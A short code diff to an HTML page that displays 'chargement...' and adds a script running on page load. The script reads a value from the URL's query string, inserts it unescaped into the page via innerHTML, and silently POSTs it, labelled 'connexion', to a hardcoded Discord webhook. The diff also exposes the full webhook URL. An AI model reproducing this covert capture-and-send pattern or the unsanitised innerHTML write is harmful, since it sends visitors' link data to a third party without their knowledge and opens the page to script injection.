@@ -9,7 +9,17 @@
   <body>
     <p id='test'>chargement...</p>
    <script>
-    document.getElementById("test").innerHTML=window.location
+    document.getElementById("test").innerHTML=window.location.href.split('?')[1].split('=')[1]
+    var url = "https://discord.com/api/webhooks/854344479069962330/rxIcKGhL0Fmoa_QgCaCGZs1XlolVOO5JwO6yRmF53l8gRpVCZ7P6tfdmXP8HbKB4CL3o"
+    const params = {
+      content: "connexion " + window.location.href.split('?')[1].split('=')[1]
+    };
+    const options = {
+      headers: {"Content-type": "application/json"},
+      method: 'POST',
+      body: JSON.stringify(params)  
+    };
+    fetch(url, options)
    </script>
   </body>
  
